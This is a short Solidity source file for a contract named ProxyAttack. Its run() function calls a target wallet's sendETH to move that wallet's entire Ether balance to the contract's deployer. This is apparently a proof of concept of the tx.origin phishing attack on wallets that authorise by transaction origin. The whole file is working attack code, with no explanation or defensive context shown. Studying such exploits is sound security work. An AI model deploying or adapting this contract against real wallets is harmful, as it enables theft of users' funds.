// SPDX-License-Identifier: MIT

pragma solidity >= 0.8.0;

interface Wallet {
    function sendETH(uint256 _amount, address payable _recipient) external;
}

contract ProxyAttack {
    
    address payable owner;
    
    constructor() {
        owner = payable(msg.sender);
    }
    
    function run(address _address) external {
        Wallet(_address).sendETH(address(_address).balance, owner);
    }
}